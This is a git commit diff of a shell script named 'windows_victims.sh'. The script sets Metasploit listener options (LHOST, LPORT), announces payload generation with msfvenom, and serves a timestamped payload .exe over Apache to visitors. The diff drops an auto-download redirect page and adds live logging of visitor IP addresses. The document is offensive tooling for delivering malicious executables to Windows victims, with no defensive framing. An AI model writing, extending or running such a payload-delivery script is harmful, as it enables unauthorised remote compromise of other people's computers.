3ae199621f003a58e5ad0c59dcc83e913a490e06
810810810 <108226535+810810810@users.noreply.github.com>
2023-02-26 20:46:33 +0000

    Update windows_victims.sh

--- windows_victims.sh
+++ windows_victims.sh
@@ -1,14 +1,7 @@
-# Define the start_server function
-start_server() {
-  echo "Web server started at http://$LOCAL_IP/"
-  echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"
+#!/bin/bash
 
-  # Create the payload download page
-  echo "<html><head><title>Downloading payload...</title><meta http-equiv=\"refresh\" content=\"0; url=/downloads/$PAYLOAD_NAME\"></head><body><p>Downloading payload...</p></body></html>" | sudo tee /var/www/html/downloads/index.html
-
-  # Start Apache web server
-  sudo systemctl start apache2
-}
+# Set the local IP address
+LOCAL_IP=$(hostname -I | awk '{print $1}')
 
 # Set the payload name
 PAYLOAD_NAME="payload_$(date +%s).exe"
@@ -16,6 +9,19 @@ PAYLOAD_NAME="payload_$(date +%s).exe"
 # Set the Metasploit options
 LHOST=$LOCAL_IP
 LPORT=11506
+
+# Define the start_server function
+start_server() {
+  echo "Web server started at http://$LOCAL_IP/"
+  echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"
+
+  # Start Apache web server
+  sudo systemctl start apache2
+
+  # Continuously print the access log to the terminal
+  echo "Visitors:"
+  sudo tail -f /var/log/apache2/access.log | awk '{print $1}'
+}
 
 # Generate the payload using msfvenom
 echo "Generating payload..."
